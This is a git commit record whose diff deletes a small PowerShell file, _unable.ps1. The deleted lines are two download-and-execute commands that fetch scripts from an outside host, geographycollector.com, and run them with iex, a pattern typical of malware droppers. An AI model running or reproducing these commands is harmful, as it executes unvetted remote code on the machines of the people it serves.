6a758253f9f75d5d36f536e378369501c3e1ab25
tguglanaklona <tguglanaklona@gmail.com>
2015-12-28 23:58:29 +0300

    m

--- _unable.ps1
+++
@@ -1,2 +0,0 @@
-iex(New-Object Net.WebClient).DownloadString('http://www.geographycollector.com/onetask.ps1');
-iex(New-Object Net.WebClient).DownloadString('http://www.geographycollector.com/messagebox.ps1');
